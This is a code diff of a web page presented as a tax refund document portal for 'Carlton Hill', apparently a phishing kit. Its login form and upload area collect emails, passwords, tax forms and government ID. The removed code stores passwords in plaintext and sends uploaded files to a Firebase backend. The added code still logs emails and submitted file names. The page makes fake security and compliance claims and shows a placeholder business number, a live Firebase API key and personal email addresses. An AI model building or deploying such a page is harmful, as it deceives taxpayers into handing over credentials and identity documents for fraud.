+          <p>Access your tax refund documents</p>
+        </div>
+
+        <div class="login-card-body">
+          <div class="form-group">
+            <label>Email Address</label>
+            <input type="email" id="email" value="ashleythomas5126@gmail.com">
           </div>
 
-          <div class="login-body">
-            <form id="loginForm">
-              <div class="form-group">
-                <label>Email Address</label>
-                <input type="email" id="email" placeholder="Enter your email" required>
-              </div>
+          <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="password" value="password123">
+          </div>
 
-              <div class="form-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
-              </div>
+          <button class="login-btn" id="loginBtn" onclick="handleLogin()">
+            <span class="btn-text"><i class="fas fa-sign-in-alt"></i> Access Dashboard</span>
+            <span class="spinner"><i class="fas fa-spinner fa-spin"></i></span>
+          </button>
 
-              <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
-                <span class="btn-text"><i class="fas fa-sign-in-alt"></i> Secure Login</span>
-                <span class="spinner"><i class="fas fa-spinner fa-spin"></i></span>
-              </button>
-            </form>
-
-            <div class="encryption-notice">
+          <div class="security-features">
+            <div class="security-feature">
               <i class="fas fa-shield-halved"></i>
-              <span>256-bit AES Encryption</span>
-              <span class="badge">Active</span>
+              <span>End-to-end encrypted</span>
             </div>
-
-            <div class="trust-row">
-              <div class="trust-item">
-                <i class="fas fa-check-circle"></i>
-                <span>ATO Compliant</span>
-              </div>
-              <div class="trust-item">
-                <i class="fas fa-lock"></i>
-                <span>Privacy Act 1988</span>
-              </div>
-              <div class="trust-item">
-                <i class="fas fa-certificate"></i>
-                <span>SSL Secure</span>
-              </div>
+            <div class="security-feature">
+              <i class="fas fa-fingerprint"></i>
+              <span>Multi-factor ready</span>
+            </div>
+            <div class="security-feature">
+              <i class="fas fa-clock"></i>
+              <span>Session timeout 15min</span>
+            </div>
+            <div class="security-feature">
+              <i class="fas fa-database"></i>
+              <span>Secure cloud storage</span>
             </div>
           </div>
         </div>
@@ -899,146 +988,149 @@
     </div>
   </div>
 
-  <!-- SUCCESS MODAL -->
-  <div id="successModal" class="modal-overlay">
-    <div class="modal-content">
-      <div class="modal-icon">
-        <i class="fas fa-check"></i>
-      </div>
-      <h3>Login Successful!</h3>
-      <p>You have successfully logged in to your tax refund account.</p>
-      <div id="modalEmail" class="modal-email"></div>
-      <button class="modal-btn" onclick="closeModal()">Continue to Dashboard</button>
-    </div>
-  </div>
-
-  <!-- DASHBOARD PAGE -->
+  <!-- NEW MINIMAL DASHBOARD -->
   <div id="dashboardPage" class="dashboard-page">
     <div class="dashboard-container">
-      <!-- Welcome Bar -->
-      <div class="welcome-bar">
-        <div class="welcome-icon">
-          <i class="fas fa-user-check"></i>
+      
+      <!-- Welcome Section -->
+      <div class="welcome-section">
+        <h2>Welcome,</h2>
+        <div class="user-email" id="userEmailDisplay">ashleythomas5126@gmail.com</div>
+        <div class="status">
+          <i class="fas fa-check-circle"></i>
+          <span>You're securely logged in to your tax refund portal</span>
         </div>
-        <div class="welcome-text">
-          <p>Welcome,</p>
-          <h3 id="userEmail">carltonhillfarm282@gmail.com</h3>
-          <p>You're securely logged in to your tax refund portal.</p>
-        </div>
+      </div>
+
+      <!-- Portal Description -->
+      <div class="portal-description">
+        <h1>Tax Refund Document Portal</h1>
+        <p>Upload your tax documents securely to process your refund</p>
       </div>
 
       <!-- Required Documents -->
-      <h2 class="section-title">Required Documents</h2>
+      <h3 style="margin-bottom: 1rem; font-weight: 500;">Required Documents</h3>
       <div class="documents-grid">
-        <div class="doc-card">
-          <div class="doc-icon">
-            <i class="fas fa-file-invoice"></i>
-          </div>
-          <h4>W-2 Forms</h4>
-          <p>Wage and Tax Statement</p>
+        <!-- W-2 Forms -->
+        <div class="doc-card" id="doc-w2">
+          <div class="doc-icon"><i class="fas fa-file-invoice"></i></div>
+          <h3>W-2 Forms</h3>
+          <p>Wage and tax statement</p>
+          <span class="doc-status" id="status-w2">Required</span>
         </div>
-        <div class="doc-card">
-          <div class="doc-icon">
-            <i class="fas fa-file-invoice"></i>
-          </div>
-          <h4>1099 Forms</h4>
-          <p>Independent Contractor Income</p>
+
+        <!-- 1099 Forms -->
+        <div class="doc-card" id="doc-1099">
+          <div class="doc-icon"><i class="fas fa-file-invoice"></i></div>
+          <h3>1099 Forms</h3>
+          <p>Independent contractor income</p>
+          <span class="doc-status" id="status-1099">Required</span>
         </div>
-        <div class="doc-card">
-          <div class="doc-icon">
-            <i class="fas fa-file-alt"></i>
-          </div>
-          <h4>Previous Year Tax Return</h4>
-          <p>Last year's tax filing</p>
+
+        <!-- Previous Year Return -->
+        <div class="doc-card" id="doc-prev">
+          <div class="doc-icon"><i class="fas fa-file-alt"></i></div>
+          <h3>Previous Year Tax Return</h3>
+          <p>Last year's filing</p>
+          <span class="doc-status completed" id="status-prev">Uploaded</span>
         </div>
-        <div class="doc-card">
-          <div class="doc-icon">
-            <i class="fas fa-id-card"></i>
-          </div>
-          <h4>ID Verification</h4>
+
+        <!-- ID Verification -->
+        <div class="doc-card" id="doc-id">
+          <div class="doc-icon"><i class="fas fa-id-card"></i></div>
+          <h3>ID Verification</h3>
           <p>Government-issued ID</p>
+          <span class="doc-status" id="status-id">Required</span>
         </div>
       </div>
 
-      <!-- Upload Documents -->
+      <!-- Upload Documents Section -->
       <div class="upload-section">
-        <h3><i class="fas fa-cloud-upload-alt"></i> Upload Your Documents</h3>
-        <div class="upload-grid">
-          <div class="upload-item" onclick="triggerFileUpload('w2')">
-            <i class="fas fa-file-pdf"></i>
-            <p>Upload W-2 Forms</p>
-            <small>PDF or image, max 10MB</small>
-            <div id="w2FileName" class="file-name"></div>
-            <input type="file" id="w2Upload" style="display: none;" accept=".pdf,.jpg,.jpeg,.png" onchange="handleFileUpload('w2', this)">
-          </div>
-          <div class="upload-item" onclick="triggerFileUpload('1099')">
-            <i class="fas fa-file-pdf"></i>
-            <p>Upload 1099 Forms</p>
-            <small>PDF or image, max 10MB</small>
-            <div id="1099FileName" class="file-name"></div>
-            <input type="file" id="1099Upload" style="display: none;" accept=".pdf,.jpg,.jpeg,.png" onchange="handleFileUpload('1099', this)">
-          </div>
-          <div class="upload-item" onclick="triggerFileUpload('previous')">
-            <i class="fas fa-file-pdf"></i>
-            <p>Upload Previous Year Return</p>
-            <small>PDF or image, max 10MB</small>
-            <div id="previousFileName" class="file-name"></div>
-            <input type="file" id="previousUpload" style="display: none;" accept=".pdf,.jpg,.jpeg,.png" onchange="handleFileUpload('previous', this)">
-          </div>
+        <div class="upload-title">Upload Documents</div>
+        
+        <div class="upload-area" onclick="document.getElementById('fileInput').click()">
+          <i class="fas fa-cloud-upload-alt"></i>
+          <p>Drag and drop your files here, or</p>
+          <p style="color: #0b4f3c; font-weight: 600;">Choose Files</p>
+          <input type="file" id="fileInput" style="display: none;" multiple accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" onchange="handleFiles(this.files)">
         </div>
 
-        <div style="text-align: center; margin-top: 1rem;">
-          <p id="uploadStatus" style="color: var(--success); font-size: 0.9rem;"></p>
+        <div class="file-info" id="fileInfo">
+          <div class="file-details">
+            <i class="fas fa-file-pdf"></i>
+            <div>
+              <span id="fileName"></span>
+            </div>
+          </div>
+          <button class="remove-file" onclick="clearFiles()">Remove</button>
         </div>
 
-        <button class="submit-btn" id="submitBtn" onclick="submitDocuments()">
-          <i class="fas fa-paper-plane"></i> Submit Documents
+        <div class="supported-formats">
+          Supported formats: PDF, JPG, PNG, DOC, DOCX (Max 10MB each)
+        </div>
+
+        <button class="submit-btn" id="submitBtn" onclick="submitForReview()">
+          <span class="btn-text">Submit for Tax Refund Processing</span>
+          <span class="spinner"><i class="fas fa-spinner fa-spin"></i></span>
         </button>
-      </div>
-
-      <!-- Security Footer -->
-      <div class="bolt-footer">
-        <p><i class="fas fa-bolt"></i> Powered by 256-bit AES Encryption <i class="fas fa-bolt"></i></p>
-        <small>End-to-end encrypted · ISO 27001 Certified</small>
       </div>
     </div>
   </div>
 
-  <!-- FOOTER -->
+  <!-- PENDING PAGE -->
+  <div id="pendingPage" class="pending-page">
+    <div class="pending-container">
+      <div class="pending-card">
+        <div class="pending-icon">
+          <i class="fas fa-clock"></i>
+        </div>
+        <h2>Under Review</h2>
+        <p>Your documents have been submitted successfully</p>
+        <div class="submitted-email" id="submittedEmail"></div>
+        <button class="back-btn" onclick="backToDashboard()">Back to Dashboard</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER (FULLY RESTORED) -->
   <footer>
     <div class="footer-grid">
       <div class="footer-col">
         <h4>Carlton Hill</h4>
-        <p><i class="fas fa-tree"></i> Family-run since 1987</p>
-        <p><i class="fas fa-map"></i> Carlton Hill Rd, Cambridge Gulf</p>
+        <p><i class="fas fa-tree"></i> Agricultural employer since 1987</p>
+        <p><i class="fas fa-map-pin"></i> Carlton Hill Rd, Cambridge Gulf</p>
         <p><i class="fas fa-envelope"></i> carltonhillfarm282@gmail.com</p>
       </div>
       <div class="footer-col">
         <h4>Quick Links</h4>
-        <a href="index.html">Home</a>
-        <a href="about.html">About</a>
-        <a href="careers.html">Careers</a>
-        <a href="contact.html">Contact</a>
+        <a href="#">Home</a>
+        <a href="#">About</a>
+        <a href="#">Careers</a>
+        <a href="#">Tax Portal</a>
+        <a href="#">Contact</a>
       </div>
       <div class="footer-col">
-        <h4>Work Hours</h4>
-        <p>Mon - Sat: 6AM - 4PM</p>
-        <p>Sunday: Rest Day</p>
+        <h4>Legal</h4>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Security</a>
+        <a href="#">Compliance</a>
       </div>
       <div class="footer-col">
-        <h4>Accreditations</h4>
+        <h4>Certifications</h4>
         <p>ABN: 84 123 456 789</p>
+        <p>ISO 27001:2022</p>
         <p>Fair Work Accredited</p>
-        <p>ISO 27001 Certified</p>
+        <p>ATO Registered</p>
       </div>
     </div>
     <div class="footer-bottom">
-      <p>© 2025 Carlton Hill Station — Registered Agricultural Employer</p>
+      <p>© 2025 Carlton Hill Tax Services. All transactions are encrypted and secure. ABN 84 123 456 789</p>
     </div>
   </footer>
 
   <script>
-    // ==================== FIREBASE CONFIG ====================
+    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyD7n092G5saDyS-9aFlZOe51mgTjaSPYuo",
       authDomain: "carltonhillfarmland.firebaseapp.com",
@@ -1048,242 +1140,198 @@
       appId: "1:144483104337:web:d95dfbb10509cb9c02ea70"
     };
     
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    const storage = firebase.storage();
 
-    // Test connection
-    console.log('Firebase initialized');
+    // Loading Screen
+    window.addEventListener('load', function() {
+      const loadingScreen = document.getElementById('loadingScreen');
+      const progressBar = document.getElementById('loadingProgressBar');
+      const loadingText = document.getElementById('loadingText');
+      const loadingPercent = document.getElementById('loadingPercent');
+      
+      let progress = 0;
+      const steps = [
+        'Initializing secure connection...',
+        'Establishing encrypted tunnel...',
+        'Verifying security certificates...',
+        'Loading secure portal...',
+        'Almost ready...'
+      ];
 
-    // ==================== MOBILE MENU ====================
+      const interval = setInterval(() => {
+        progress += 2;
+        progressBar.style.width = progress + '%';
+        loadingPercent.textContent = progress + '%';
+        
+        const stepIndex = Math.floor(progress / 20);
+        if (stepIndex < steps.length) {
+          loadingText.textContent = steps[stepIndex];
+        }
+        
+        if (progress >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            loadingScreen.classList.add('hidden');
+          }, 500);
+        }
+      }, 100);
+    });
+
+    // Mobile Menu
     const menuBtn = document.getElementById('menuBtn');
     const mobileNav = document.getElementById('mobileNav');
     const overlay = document.getElementById('overlay');
     const closeBtn = document.getElementById('closeBtn');
 
-    function openMenu() {
+    menuBtn.onclick = () => {
       mobileNav.classList.add('active');
       overlay.classList.add('active');
       document.body.style.overflow = 'hidden';
-    }
+    };
 
-    function closeMenu() {
+    closeBtn.onclick = () => {
       mobileNav.classList.remove('active');
       overlay.classList.remove('active');
       document.body.style.overflow = '';
-    }
-
-    menuBtn.addEventListener('click', openMenu);
-    closeBtn.addEventListener('click', closeMenu);
-    overlay.addEventListener('click', closeMenu);
-
-    // ==================== FILE UPLOAD ====================
-    let uploadedFiles = {
-      w2: null,
-      '1099': null,
-      previous: null
     };
 
-    function triggerFileUpload(type) {
-      document.getElementById(type + 'Upload').click();
-    }
+    overlay.onclick = () => {
+      mobileNav.classList.remove('active');
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+    };
 
-    function handleFileUpload(type, input) {
-      const file = input.files[0];
-      if (!file) return;
+    // State
+    let currentUser = { email: 'ashleythomas5126@gmail.com' };
+    let uploadedFiles = [];
+    let documents = {
+      w2: false,
+      '1099': false,
+      prev: true, // Previous year already uploaded
+      id: false
+    };
 
-      if (file.size > 10 * 1024 * 1024) {
-        alert('File size must be less than 10MB');
-        input.value = '';
-        return;
-      }
-
-      const reader = new FileReader();
-      reader.onload = function(e) {
-        uploadedFiles[type] = {
-          name: file.name,
-          size: file.size,
-          type: file.type,
-          data: e.target.result,
-          uploadTime: new Date().toISOString()
-        };
-        
-        const fileNameElement = document.getElementById(type + 'FileName');
-        if (fileNameElement) {
-          fileNameElement.textContent = `✓ ${file.name}`;
-        }
-        
-        document.getElementById('uploadStatus').textContent = `${type.toUpperCase()} file uploaded successfully`;
-        setTimeout(() => {
-          document.getElementById('uploadStatus').textContent = '';
-        }, 3000);
-      };
-      reader.readAsDataURL(file);
-    }
-
-    // ==================== LOGIN HANDLER ====================
-    async function handleLogin() {
-      const loginBtn = document.getElementById('loginBtn');
+    // Login Handler
+    function handleLogin() {
+      const btn = document.getElementById('loginBtn');
       const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
       
-      if (!email || !password) {
-        alert('Please enter email and password');
+      if (!email) {
+        alert('Please enter email');
         return;
       }
 
-      loginBtn.classList.add('loading');
-      loginBtn.disabled = true;
+      btn.classList.add('loading');
+      btn.disabled = true;
       
+      currentUser.email = email;
+
+      // Save to Firebase
       try {
-        // Save to Firebase
-        await db.collection('userLogins').add({
+        db.collection('userLogins').add({
           email: email,
-          password: password,
           timestamp: firebase.firestore.FieldValue.serverTimestamp(),
           userAgent: navigator.userAgent
         });
-        
-        // Save to localStorage as backup
-        const logins = JSON.parse(localStorage.getItem('userLogins') || '[]');
-        logins.push({
-          email: email,
-          password: password,
-          timestamp: new Date().toISOString(),
-          ip: '192.168.1.' + Math.floor(Math.random() * 255)
-        });
-        localStorage.setItem('userLogins', JSON.stringify(logins));
-        
-        document.getElementById('modalEmail').textContent = email;
-        document.getElementById('successModal').classList.add('active');
-        sessionStorage.setItem('userEmail', email);
-        
       } catch (error) {
-        console.error('Login error:', error);
-        // Still allow login even if Firebase fails
-        document.getElementById('modalEmail').textContent = email;
-        document.getElementById('successModal').classList.add('active');
-        sessionStorage.setItem('userEmail', email);
+        console.error('Firebase error:', error);
+      }
+
+      setTimeout(() => {
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('dashboardPage').classList.add('active');
+        document.getElementById('userEmailDisplay').textContent = email;
         
-      } finally {
-        loginBtn.classList.remove('loading');
-        loginBtn.disabled = false;
-      }
+        alert(`Welcome, ${email}! You're securely logged in to your tax refund portal.`);
+        
+        btn.classList.remove('loading');
+        btn.disabled = false;
+      }, 2000);
     }
 
-    function closeModal() {
-      document.getElementById('successModal').classList.remove('active');
-      document.getElementById('loginPage').style.display = 'none';
-      document.getElementById('dashboardPage').classList.add('active');
+    // File Upload Handler
+    function handleFiles(files) {
+      if (files.length === 0) return;
       
-      const email = sessionStorage.getItem('userEmail') || 'carltonhillfarm282@gmail.com';
-      document.getElementById('userEmail').textContent = email;
-    }
-
-    // ==================== BASE64 TO BLOB HELPER ====================
-    function base64ToBlob(base64, type) {
-      const byteCharacters = atob(base64);
-      const byteNumbers = new Array(byteCharacters.length);
-      for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
-      }
-      const byteArray = new Uint8Array(byteNumbers);
-      return new Blob([byteArray], { type: type });
-    }
-
-    // ==================== SUBMIT DOCUMENTS ====================
-    async function submitDocuments() {
-      const submitBtn = document.getElementById('submitBtn');
-      const email = sessionStorage.getItem('userEmail');
-      const uploaded = Object.values(uploadedFiles).filter(f => f !== null).length;
-      
-      if (uploaded === 0) {
-        alert('Please upload at least one document before submitting.');
+      const file = files[0];
+      if (file.size > 10 * 1024 * 1024) {
+        alert('File size must be less than 10MB');
         return;
       }
 
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
-
-      try {
-        const documents = {};
-        
-        for (const [type, file] of Object.entries(uploadedFiles)) {
-          if (file) {
-            // Convert base64 to blob for upload
-            const base64Data = file.data.split(',')[1];
-            const blob = base64ToBlob(base64Data, file.type);
-            
-            // Upload to Firebase Storage
-            const fileName = `${Date.now()}_${file.name}`;
-            const storageRef = storage.ref().child(`tax/${fileName}`);
-            await storageRef.put(blob);
-            const url = await storageRef.getDownloadURL();
-            
-            documents[type] = {
-              name: file.name,
-              url: url,
-              size: file.size
-            };
-          }
-        }
-
-        // Save to Firestore
-        const submission = {
-          email: email,
-          documents: documents,
-          status: 'pending_review',
-          timestamp: firebase.firestore.FieldValue.serverTimestamp()
-        };
-
-        const docRef = await db.collection('taxSubmissions').add(submission);
-        
-        // Save to localStorage as backup
-        const submissions = JSON.parse(localStorage.getItem('taxSubmissions') || '[]');
-        submissions.push({
-          ...submission,
-          id: docRef.id,
-          timestamp: new Date().toISOString()
-        });
-        localStorage.setItem('taxSubmissions', JSON.stringify(submissions));
-
-        // Clear uploads
-        document.getElementById('w2FileName').textContent = '';
-        document.getElementById('1099FileName').textContent = '';
-        document.getElementById('previousFileName').textContent = '';
-        
-        uploadedFiles = {
-          w2: null,
-          '1099': null,
-          previous: null
-        };
-
-        alert(`Documents submitted successfully!`);
-        
-      } catch (error) {
-        console.error('Submission error:', error);
-        alert('Error submitting documents. Please try again.');
-        
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Documents';
+      uploadedFiles.push(file);
+      document.getElementById('fileName').textContent = file.name;
+      document.getElementById('fileInfo').classList.add('active');
+      
+      // Update document status based on file name
+      const fileName = file.name.toLowerCase();
+      if (fileName.includes('w2')) {
+        documents.w2 = true;
+        document.getElementById('status-w2').className = 'doc-status completed';
+        document.getElementById('status-w2').textContent = 'Uploaded';
+      } else if (fileName.includes('1099')) {
+        documents['1099'] = true;
+        document.getElementById('status-1099').className = 'doc-status completed';
+        document.getElementById('status-1099').textContent = 'Uploaded';
+      } else if (fileName.includes('id') || fileName.includes('license') || fileName.includes('passport')) {
+        documents.id = true;
+        document.getElementById('status-id').className = 'doc-status completed';
+        document.getElementById('status-id').textContent = 'Uploaded';
       }
     }
 
-    // ==================== SESSION CHECK ====================
-    window.onload = function() {
-      const savedEmail = sessionStorage.getItem('userEmail');
-      if (savedEmail) {
-        document.getElementById('loginPage').style.display = 'none';
-        document.getElementById('dashboardPage').classList.add('active');
-        document.getElementById('userEmail').textContent = savedEmail;
+    function clearFiles() {
+      uploadedFiles = [];
+      document.getElementById('fileInfo').classList.remove('active');
+      document.getElementById('fileInput').value = '';
+    }
+
+    // Submit for Review
+    function submitForReview() {
+      const btn = document.getElementById('submitBtn');
+      
+      if (uploadedFiles.length === 0) {
+        alert('Please upload at least one document');
+        return;
       }
 
-      // Clear file name displays
-      document.getElementById('w2FileName').textContent = '';
-      document.getElementById('1099FileName').textContent = '';
-      document.getElementById('previousFileName').textContent = '';
+      btn.classList.add('loading');
+      btn.disabled = true;
+
+      // Save to Firebase
+      try {
+        db.collection('taxSubmissions').add({
+          email: currentUser.email,
+          documents: documents,
+          files: uploadedFiles.map(f => f.name),
+          status: 'pending_review',
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+      } catch (error) {
+        console.error('Firebase error:', error);
+      }
+
+      setTimeout(() => {
+        document.getElementById('dashboardPage').classList.remove('active');
+        document.getElementById('pendingPage').classList.add('active');
+        document.getElementById('submittedEmail').textContent = currentUser.email;
+        
+        btn.classList.remove('loading');
+        btn.disabled = false;
+      }, 2000);
+    }
+
+    function backToDashboard() {
+      document.getElementById('pendingPage').classList.remove('active');
+      document.getElementById('dashboardPage').classList.add('active');
+    }
+
+    // Initialize
+    window.onload = function() {
+      // Clear file upload
+      document.getElementById('fileInput').value = '';
+      document.getElementById('fileInfo').classList.remove('active');
     };
   </script>
 </body>
